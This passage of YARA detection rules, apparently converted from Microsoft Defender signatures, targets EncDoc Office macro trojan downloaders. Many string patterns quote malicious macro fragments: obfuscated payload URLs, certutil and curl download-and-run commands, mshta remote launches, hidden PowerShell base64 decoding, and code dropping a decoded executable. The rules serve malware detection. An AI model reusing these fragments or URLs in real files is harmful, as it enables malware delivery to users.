        $x_1_8 = {46 75 6e 63 74 69 6f 6e 20 41 64 5f 63 6f 6d 6d 28 29 02 00 44 20 3d 20 22 54 22 3a 20 44 20 3d 20 44 20 26 20 22 55 22 02 00 53 68 65 65 74 73 28 36 37 20 2d 20 36 36 29 2e 43 65 6c 6c 73 28 33 31 2c 20 34 20 2b 20 30 29 2e 46 6f 72 6d 75 6c 61 20 3d 20 22 3d 52 45 22 20 26 20 44 20 26 20 22 52 4e 28 29 22 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (6 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_RP_2147758832_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RP!MTB"
        threat_id = "2147758832"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2d 77 20 68 69 20 73 6c 65 5e 65 5e 70 20 2d 53 65 20 33 31 3b 53 74 61 72 74 2d 42 69 74 73 54 72 61 6e 73 66 65 72 20 2d 53 6f 75 72 63 65 20 68 74 74 60 70 3a 2f 2f [0-47] 2f 72 65 6d 69 74 2e 65 60 78 65}  //weight: 1, accuracy: Low
        $x_1_2 = {73 68 65 65 65 20 3d 20 22 73 68 65 6c 22 0d 0a 6f 62 68 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 73 68 65 65 65 20 26 20 22 6c 2e 61 70 70 6c 69 63 61 74 69 6f 6e 22 29 2e 4f 70 65 6e 28 [0-31] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_RP_2147758832_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RP!MTB"
        threat_id = "2147758832"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"h\"&\"ttp\"&\"s://aleairyapps.com/n1wUIMSz/bg.p\"&\"n\"&\"g\"" ascii //weight: 1
        $x_1_2 = "\"ht\"&\"tps://bandariexpeditions.com/HrIWrCG7No/bg.p\"&\"n\"&\"g\"" ascii //weight: 1
        $x_1_3 = "\"htt\"&\"ps://efendri.net/zcj7VpA98P/bg.p\"&\"n\"&\"g\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_RP_2147758832_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RP!MTB"
        threat_id = "2147758832"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {28 22 36 38 37 34 37 34 37 30 37 33 33 61 32 66 32 66 22 29 20 26 20 [0-31] 28 22 36 35 37 32 37 32 36 66 37 32 32 64 36 63 36 39 36 65 36 62 32 65 36 38 36 35 37 32 36 66 36 62 37 35 36 31 37 30 37 30 32 65 36 33 36 66 36 64 32 66 36 34 36 66 37 37 36 65 36 63 36 66 36 31 36 34 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {28 22 37 30 37 35 37 34 37 34 37 39 32 65 36 35 37 38 22 29 20 26 20 [0-31] 28 22 36 35 22 29 0d 0a [0-31] 20 3d 20 45 6e 76 69 72 6f 6e 28 22 54 45 4d 50 22 29 20 26 20 22 5c 22 20 26 20 01}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_RP_2147758832_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RP!MTB"
        threat_id = "2147758832"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 65 62 75 67 2e 50 72 69 6e 74 20 4d 73 67 42 6f 78 28 53 74 72 52 65 76 65 72 73 65 28 [0-31] 2c 20 22 [0-31] 22 29 29 2c 20 76 62 4f 4b 43 61 6e 63 65 6c 29 3b 20 72 65 74 75 72 6e 73 3b 20 31}  //weight: 1, accuracy: Low
        $x_1_2 = "R(i) = R(i) Xor (s((s((B + 1) Mod 256) + s(C)) Mod 256))" ascii //weight: 1
        $x_1_3 = "= StrConv(R(), vbUnicode)" ascii //weight: 1
        $x_1_4 = "Debug.Assert (VBA.Shell(kingdom))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_RP_2147758832_4
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RP!MTB"
        threat_id = "2147758832"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "\\syswow64\\windowspowershell\\v1.0\\powershell.exe\"" ascii //weight: 1
        $x_1_2 = {20 2b 20 22 64 65 72 20 28 24 28 4e 65 77 2d 4f 62 6a 65 63 74 20 49 4f 2e 43 6f 6d 70 72 65 73 73 69 6f 6e 2e 44 65 66 6c 61 74 65 53 74 72 65 61 6d 20 28 22 0d 0a [0-5] 20 3d 20 00 20 2b 20 22 24 28 4e 65 77 2d 4f 62 6a 65 63 74 20 49 4f 2e 4d 65 6d 6f 72 79 53 74 72 65 61 6d 20 28 2c 24 28 5b 43 6f 6e 76 65 72 74 5d 3a 3a 46 72 6f 6d 22 0d 0a 00 20 3d 20 00 20 2b 20 22 42 61 73 65 36 34 53 74 72 69 6e 67 28 [0-31] 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_RQ_2147758936_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RQ!MTB"
        threat_id = "2147758936"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "\"URLDownloadToFileA\"" ascii //weight: 1
        $x_1_2 = " = Split(e, wind(\"+\", 4))" ascii //weight: 1
        $x_1_3 = {26 20 4d 69 64 28 [0-15] 29 20 26 20 4d 69 64 28 [0-15] 29}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 52 65 70 6c 61 63 65 28 [0-47] 29}  //weight: 1, accuracy: Low
        $x_1_5 = " = \"https://\" & y" ascii //weight: 1
        $x_1_6 = "Application.Run (\"rPrint_\" & \"1\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_RQ_2147758936_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RQ!MTB"
        threat_id = "2147758936"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= objWMIService.get(\"Win32_\" & \"Process\" & \"Startup\")" ascii //weight: 1
        $x_1_2 = "= GetObject(\"win\" & \"mgmts\" & \":\\\\\" & strComputer & \"\\root\" & \"\\cimv2\")" ascii //weight: 1
        $x_1_3 = "objProcess.Create \"C:\\Windows\\System32\\mshta.exe https://service-7pxel2bo-1304343953.gz.apigw.tencentcs.com/picmage\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_RQ_2147758936_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RQ!MTB"
        threat_id = "2147758936"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {68 74 74 70 73 3a 2f 2f 63 6f 72 74 69 6e 61 73 74 65 6c 61 73 79 74 72 61 7a 6f 73 2e 63 6f 6d 2f [0-10] 2f 73 65 63 2e 68 74 6d 6c}  //weight: 1, accuracy: Low
        $x_1_2 = {68 74 74 70 73 3a 2f 2f 6f 72 71 75 69 64 65 61 76 61 6c 6c 65 6e 61 74 61 2e 63 6f 6d 2f [0-10] 2f 73 65 63 2e 68 74 6d 6c}  //weight: 1, accuracy: Low
        $x_1_3 = {68 74 74 70 73 3a 2f 2f 66 75 6e 64 61 63 69 6f 6e 76 65 72 64 61 64 65 72 6f 73 68 65 72 6f 65 73 2e 63 6f 6d 2f [0-10] 2f 73 65 63 2e 68 74 6d 6c}  //weight: 1, accuracy: Low
        $x_1_4 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 22 26 22 73 22 26 22 3a 22 26 22 2f 22 26 22 2f 67 65 6e 65 72 61 74 6f 72 75 6c 75 62 61 62 61 6e 75 2e 72 6f 2f [0-15] 2f 73 6f 74 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c 22}  //weight: 1, accuracy: Low
        $x_1_5 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 22 26 22 73 22 26 22 3a 22 26 22 2f 22 26 22 2f 6f 74 74 61 77 61 70 72 6f 63 65 73 73 73 65 72 76 65 72 73 2e 63 61 2f [0-15] 2f 73 6f 74 2e 68 74 6d 6c 22}  //weight: 1, accuracy: Low
        $x_1_6 = {22 68 22 26 22 74 74 70 73 3a 2f 2f 74 6f 74 61 6c 6c 79 62 61 6b 65 64 2e 63 61 2f [0-15] 2f 73 6f 74 2e 68 22 26 22 74 6d 6c}  //weight: 1, accuracy: Low
        $x_1_7 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 72 69 63 61 72 64 6f 70 69 72 65 73 66 6f 74 6f 67 72 61 66 69 61 2e 63 6f 6d 2f [0-15] 22 26 22 68 6f 73 74 2e 68 74 6d 6c}  //weight: 1, accuracy: Low
        $x_1_8 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 22 26 22 73 3a 2f 2f 6b 65 79 73 69 74 65 2e 63 6f 6d 2e 63 6f 2f [0-15] 22 26 22 68 6f 73 74 2e 68 74 6d 6c}  //weight: 1, accuracy: Low
        $x_1_9 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 22 26 22 73 3a 2f 2f 63 6f 6c 65 67 69 6f 62 69 6c 69 6e 67 75 65 70 69 6f 78 69 69 2e 63 6f 6d 2e 63 6f 2f [0-15] 22 26 22 68 6f 73 74 2e 68 74 6d 6c}  //weight: 1, accuracy: Low
        $x_1_10 = {68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 65 6c 69 74 65 6b 68 61 74 73 61 63 63 6f 2e 63 6f 2e 6b 65 2f [0-15] 2f 64 61 79 2e 68 22 26 22 74 6d 6c 22}  //weight: 1, accuracy: Low
        $x_1_11 = {68 22 26 22 74 22 26 22 74 70 73 3a 2f 2f 73 75 6b 6d 61 62 61 6c 69 2e 63 6f 6d 2f [0-15] 2f 64 61 79 2e 68 22 26 22 74 6d 6c 22}  //weight: 1, accuracy: Low
        $x_1_12 = {22 68 22 26 22 74 22 26 22 74 70 73 3a 2f 2f 6c 66 7a 6f 6d 62 69 65 67 61 6d 65 73 2e 63 6f 6d 2f [0-15] 2f 64 61 79 2e 68 22 26 22 74 22 26 22 6d 6c 22}  //weight: 1, accuracy: Low
        $x_1_13 = {68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 66 69 6e 65 6a 65 77 65 6c 73 2e 63 6f 6d 2e 61 75 2f [0-15] 2f [0-7] 2e 68 22 26 22 74 22 26 22 6d 6c 22}  //weight: 1, accuracy: Low
        $x_1_14 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 22 26 22 73 3a 2f 2f 74 68 69 65 74 62 69 61 67 74 2e 63 6f 6d 2f [0-15] 2f [0-7] 2e 68 22 26 22 74 6d 6c 22}  //weight: 1, accuracy: Low
        $x_1_15 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 6e 65 77 2e 61 6d 65 72 69 63 6f 6c 64 2e 63 6f 6d 2f [0-15] 2f [0-7] 2e 68 22 26 22 74 22 26 22 6d 6c}  //weight: 1, accuracy: Low
        $x_1_16 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 73 22 26 22 74 22 26 22 6f 6e 65 68 69 6c 6c 2d 6e 67 2e 63 6f 6d 2f [0-10] 2f 62 6f 6c 64 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c 22}  //weight: 1, accuracy: Low
        $x_1_17 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 3a 2f 2f 76 22 26 22 6f 22 26 22 64 22 26 22 76 22 26 22 61 72 6b 61 73 70 72 69 6e 67 73 2e 63 6f 6d 2f [0-10] 2f 62 6f 6c 64 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c}  //weight: 1, accuracy: Low
        $x_1_18 = {68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 6e 22 26 22 69 22 26 22 6c 65 2d 70 6c 61 73 74 2e 63 6f 6d 2f [0-10] 2f 62 6f 6c 64 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c 20 22}  //weight: 1, accuracy: Low
        $x_1_19 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 69 22 26 22 6e 66 61 22 26 22 63 6f 72 61 75 74 6f 2e 63 6f 6d 2f [0-10] 2f 62 6f 72 74 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c 22}  //weight: 1, accuracy: Low
        $x_1_20 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 22 26 22 73 3a 2f 2f 72 6f 22 26 22 62 22 26 22 72 61 6e 6d 61 6c 6c 2e 63 6f 6d 2f [0-10] 2f 62 6f 72 74 2e 68 22 26 22 74 22 26 22 6d}  //weight: 1, accuracy: Low
        $x_1_21 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 64 22 26 22 72 22 26 22 65 61 6d 6f 6e 76 69 62 65 73 2e 63 6f 6d 2f [0-10] 2f 62 6f 72 74 2e 68 22 26 22 74 22 26 22 6d 6c 22}  //weight: 1, accuracy: Low
        $x_1_22 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 3a 2f 2f 61 22 26 22 6c 22 26 22 6c 65 6e 63 6f 67 72 61 64 69 6e 67 74 72 61 63 74 6f 72 73 65 72 76 69 63 65 2e 63 6f 6d 2f [0-10] 2f 61 6c 66 61 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c 22}  //weight: 1, accuracy: Low
        $x_1_23 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 61 22 26 22 6c 22 26 22 6c 65 6e 63 6f 64 65 6d 6f 2e 63 6f 6d 2f [0-10] 2f 61 6c 66 61 2e 68 22 26 22 74 22 26 22 6d 6c}  //weight: 1, accuracy: Low
        $x_1_24 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 62 22 26 22 65 22 26 22 6e 69 64 69 63 69 6f 6e 2e 69 6e 2f [0-10] 2f 61 6c 66 61 2e 68 22 26 22 74 22 26 22 6d 6c}  //weight: 1, accuracy: Low
        $x_1_25 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 70 22 26 22 64 6d 67 74 63 2e 6f 72 67 2f [0-15] 2f 6e 61 74 75 72 65 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c 22}  //weight: 1, accuracy: Low
        $x_1_26 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 63 22 26 22 6f 72 6f 6e 61 76 69 72 75 73 65 78 70 6c 61 6e 61 74 69 6f 6e 2e 63 6f 6d 2f [0-15] 2f 6e 61 74 75 72 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c 22}  //weight: 1, accuracy: Low
        $x_1_27 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 73 22 26 22 69 22 26 22 6c 76 65 72 6c 69 6e 69 6e 67 6f 68 69 6f 2e 63 6f 6d 2f [0-15] 2f 6e 61 74 75 2e 68 22 26 22 74 22 26 22 6d 6c 22}  //weight: 1, accuracy: Low
        $x_1_28 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 72 61 22 26 22 62 65 64 63 2e 63 6f 6d 2f [0-15] 2f 72 6f 62 2e 68 22 26 22 74 22 26 22 6d 6c 22}  //weight: 1, accuracy: Low
        $x_1_29 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 73 68 22 26 22 79 61 6d 73 67 72 6f 75 70 2e 63 6f 6d 2f [0-15] 2f 72 6f 62 65 2e 68 22 26 22 74 22 26 22 6d 6c 22}  //weight: 1, accuracy: Low
        $x_1_30 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 70 61 22 26 22 72 22 26 22 74 69 75 76 61 6d 6f 73 76 69 61 6a 61 72 2e 63 6f 6d 2f [0-15] 2f 72 6f 62 65 72 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c 22}  //weight: 1, accuracy: Low
        $x_1_31 = "\"h\"&\"t\"&\"t\"&\"ps://prf\"&\"e\"&\"lect\"&\"ri\"&\"cal.com.au/0P9ijXZ5Pm9N/rocks.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_32 = "\"h\"&\"tt\"&\"p://s\"&\"a\"&\"ber\"&\"es\"&\"poder.com.bo/7nuU7ABOj7/ro\"&\"ck.h\"&\"t\"&\"ml" ascii //weight: 1
        $x_1_33 = "\"h\"&\"t\"&\"t\"&\"ps://a\"&\"uth0.fah\"&\"im\"&\"ahmed.com/djDe0exSKwM/rok.h\"&\"t\"&\"ml" ascii //weight: 1
        $x_1_34 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 3a 2f 2f 61 6e 6a 75 22 26 22 6e 67 61 6e 2e 73 75 6b 22 26 22 61 6c 75 22 26 22 79 75 2d 70 61 6e 67 61 6c 65 22 26 22 6e 67 61 6e 2e 64 65 73 61 2e 69 64 2f [0-10] 2f 6c 65 6f 6e 73 2e 68 22 26 22 74 22 26 22 6d 22}  //weight: 1, accuracy: Low
        $x_1_35 = {22 6c 22 2c 22 4d 2e 2e 22 68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 62 61 72 22 26 22 67 75 22 26 22 6e 61 2e 70 6f 6c 69 63 65 2e 67 6f 76 2e 62 64 2f [0-15] 2f 6c 65 6f 6e 2e 68 22 26 22 74 22 26 22 6d 6c 22}  //weight: 1, accuracy: Low
        $x_1_36 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 6d 22 26 22 75 74 22 26 22 65 63 2e 63 6f 2e 7a 61 2f [0-15] 2f 6c 65 6f 73 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c 22}  //weight: 1, accuracy: Low
        $x_1_37 = "\"h\"&\"t\"&\"tps://arac\"&\"ons\"&\"ul\"&\"tori\"&\"ay\"&\"sol\"&\"uci\"&\"ones.com/TTopI2OxX/goh.g\"&\"i\"&\"f\"" ascii //weight: 1
        $x_1_38 = "\"h\"&\"tt\"&\"ps://la\"&\"kis\"&\"ur\"&\"u.com/Rob\"&\"hp9cnJJ/goh.g\"&\"i\"&\"f\"" ascii //weight: 1
        $x_1_39 = "\"h\"&\"t\"&\"t\"&\"p\"&\"s://taketuitions.com/dTEOdMByori/j.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_40 = "\"h\"&\"t\"&\"t\"&\"p\"&\"s://constructorachg.cl/eFSLb6eV/j.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_41 = "\"h\"&\"t\"&\"t\"&\"p\"&\"s://oel.tg/MSOFjh0EXRR8/j.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_RR_2147758937_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RR!MTB"
        threat_id = "2147758937"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Set objXML = CreateObject(\"MSXML2.DOMDocument\")" ascii //weight: 1
        $x_1_2 = "Set objNode = objXML.createElement(\"b64\")" ascii //weight: 1
        $x_1_3 = "objNode.DataType = \"bin.base64\"" ascii //weight: 1
        $x_1_4 = "Function DecodeBase64(ByVal strData As String) As Byte()" ascii //weight: 1
        $x_1_5 = "strTempPath = \"C:\\Users\\\" & Environ(\"USERNAME\") & \"\\Documents\\VBAMsgBox.exe\"" ascii //weight: 1
        $x_1_6 = "Open strTempPath For Binary As #" ascii //weight: 1
        $x_1_7 = "Put #1, 1, DecodeBase64(strData)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_JT_2147758993_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.JT!MTB"
        threat_id = "2147758993"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"http://doc.wikizee.com/" ascii //weight: 1
        $x_1_2 = "& \"a/doc" ascii //weight: 1
        $x_1_3 = "> \" & temp & \"\\930280a-doc" ascii //weight: 1
        $x_1_4 = "= \"cmd.exe /K curl -A" ascii //weight: 1
        $x_1_5 = "Call Shell(f, vbHide)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SKK_2147759008_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SKK!MTB"
        threat_id = "2147759008"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "filestream.SaveToFile saveTo, 2" ascii //weight: 1
        $x_1_2 = "Set http = CreateObject(\"Microsoft.XMLHTTP\")" ascii //weight: 1
        $x_1_3 = "DownloadURL = http.responseBody" ascii //weight: 1
        $x_1_4 = "Set ShellApp = CreateObject(\"Shell.Application\")" ascii //weight: 1
        $x_1_5 = "host = \"https://1990zh.com/\"" ascii //weight: 1
        $x_1_6 = "SaveFile DownloadURL(url), libFile" ascii //weight: 1
        $x_1_7 = "zFile = Environ(\"TMP\") & \"\\q.zip\"" ascii //weight: 1
        $x_1_8 = "SaveFile DownloadURL(host & \"1.wav\"), zFile" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SKS_2147759015_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SKS!MTB"
        threat_id = "2147759015"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 33 2e 31 31 30 2e 32 31 36 2e 36 34 2f 70 72 61 79 2f 72 6c 78 2f 6c 6f 61 64 65 72 2f 75 70 6c 6f 61 64 73 2f [0-31] 2e 62 61 74 22 22 20 [0-31] 2e 65 78 65 20 26 26 20 01 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 31 38 2e 31 39 33 2e 31 30 32 2e 32 33 32 2f 31 32 41 2f 6c 6f 61 64 65 72 2f 75 70 6c 6f 61 64 73 2f [0-31] 2e 65 78 65 22 22 20 [0-31] 2e 65 78 65 20 26 26 20 01 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PLI_2147759121_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PLI!MTB"
        threat_id = "2147759121"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"h\"&\"t\"&\"t\"&\"ps\"&\"://cabalasgov.com.br/OC3zbnSCG/j.h\"&\"t\"&\"m\"&\"l\",\"" ascii //weight: 1
        $x_1_2 = "\"h\"&\"t\"&\"t\"&\"ps://g\"&\"ua\"&\"te\"&\"c.com.br/NwnJ4ODx/j.h\"&\"t\"&\"m\"&\"l\",\"" ascii //weight: 1
        $x_1_3 = "\"h\"&\"tt\"&\"p\"&\"s://s\"&\"it\"&\"e.a\"&\"dv\"&\"an\"&\"certv.com/VbUzCCQo/j.h\"&\"t\"&\"m\"&\"l\",\"" ascii //weight: 1
        $x_1_4 = "\"h\"&\"t\"&\"t\"&\"p\"&\"s\"&\":\"&\"/\"&\"/a\"&\"d\"&\"v\"&\"a\"&\"n\"&\"c\"&\"e\"&\"e\"&\"n\"&\"t\"&\"e\"&\"r\"&\"t\"&\"a\"&\"i\"&\"n\"&\"m\"&\"e\"&\"n\"&\"t\"&\"a\"&\"g\"&\"e\"&\"n\"&\"c\"&\"y.c\"&\"o\"&\"m\"&\"/b\"&\"l4\"&\"Q\"&\"F\"&\"O\"&\"P\"&\"M\"&\"j\"&\"4\"&\"4\"&\"/a\"&\"l\"&\"t\"&\".h\"&\"t\"&\"m\"&\"l\",\"" ascii //weight: 1
        $x_1_5 = "\"h\"&\"t\"&\"t\"&\"p\"&\"s\"&\":/\"&\"/p\"&\"r\"&\"e\"&\"m\"&\"i\"&\"e\"&\"r\"&\"r\"&\"e\"&\"c\"&\"o\"&\"v\"&\"e\"&\"r\"&\"y.c\"&\"o\"&\"m\"&\".m\"&\"y/M\"&\"F\"&\"C\"&\"x\"&\"N\"&\"h\"&\"7\"&\"V\"&\"5\"&\"L\"&\"c/\"&\"a\"&\"l\"&\"t\"&\".h\"&\"t\"&\"m\"&\"l\",\"" ascii //weight: 1
